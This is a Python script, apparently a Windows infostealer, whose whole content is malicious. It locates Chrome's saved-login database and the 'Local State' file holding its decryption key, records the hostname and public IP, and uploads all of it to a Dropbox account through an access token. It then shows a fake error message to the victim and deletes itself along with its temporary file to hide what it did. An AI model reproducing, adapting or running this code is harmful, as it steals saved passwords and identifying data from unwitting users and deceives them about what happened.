#made by DarioStar999

import dropbox
import os
import requests
import socket

def GetLoginDataChrome():
    username = os.getenv('USERNAME')
    local_path = os.path.join(f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default", "Login Data")
    if os.path.exists(local_path):
        get_path_loadData = local_path
        return get_path_loadData
    else:
        return None
def GetLocalStateChrome():
    username = os.getenv('USERNAME')
    local_paths = os.path.join(f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data", "Local State")
    if os.path.exists(local_paths):
        get_path_loadDatas = local_paths
        return get_path_loadDatas
    else:
        return None
def getHostName():
    return socket.gethostname()
def GetIp():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip_data = response.json()
        return ip_data['ip']
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"

filename = "data.txt"
localstate = GetLocalStateChrome()
localData = GetLoginDataChrome()
ip = GetIp()
hostName = getHostName()
localdata_file = os.path.basename(localData)
localstate_file = os.path.basename(localstate)
access_token = ""

with open(filename, "w") as file:
    file.write(f"Hostname: {hostName}\nip={ip}")

with dropbox.Dropbox(access_token) as dbx:
        with open(filename, "rb") as file:
            file.seek(0)
            dbx.files_upload(file.read(), f"/{filename}", mode=dropbox.files.WriteMode.overwrite)
        if localData:
            if os.path.exists(localData):
                with open(localData, "rb") as file:
                    file.seek(0)
                    dbx.files_upload(file.read(), f"/{localdata_file}", mode=dropbox.files.WriteMode.overwrite)
            else:
                pass
        if localstate:
            if os.path.exists(localstate):
                with open(localstate, "rb") as file:
                    file.seek(0)
                    dbx.files_upload(file.read(), f"/{localstate_file}", mode=dropbox.files.WriteMode.overwrite)
            else:
                pass

print("Error executing the file, uninstalling file!")

if os.path.exists(filename):
    os.remove(filename)
    os.remove("main.py")
